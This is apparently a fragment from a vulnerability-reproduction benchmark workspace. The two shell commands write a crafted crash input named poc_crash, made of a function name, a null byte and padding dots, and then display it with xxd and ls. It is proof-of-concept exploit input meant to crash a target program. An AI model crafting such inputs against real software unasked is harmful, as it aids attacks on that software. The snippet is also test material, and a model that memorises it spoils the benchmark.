python3 -c "import sys;sys.stdout.buffer.write(b'mult_num_double\x00'+b'.'*24)" > /CybinGym_workdir/poc_crash
xxd /CybinGym_workdir/poc_crash; ls -l /CybinGym_workdir/poc_crash
